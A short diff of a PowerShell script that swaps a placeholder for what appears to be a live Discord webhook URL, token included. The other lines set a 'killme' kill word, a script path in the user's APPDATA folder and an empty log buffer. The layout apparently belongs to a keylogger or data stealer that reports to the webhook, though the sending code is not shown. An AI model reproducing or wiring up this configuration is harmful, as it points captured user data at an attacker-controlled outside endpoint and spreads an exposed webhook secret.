@@ -1,4 +1,4 @@
-$w = "YOUR_DISCORD_WEBHOOK_URL"  # <-- Replace with your webhook
+$w = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"  # <-- Replace with your webhook
 $k = "killme"
 $p = "$env:APPDATA\s.ps1"
 $l = ""
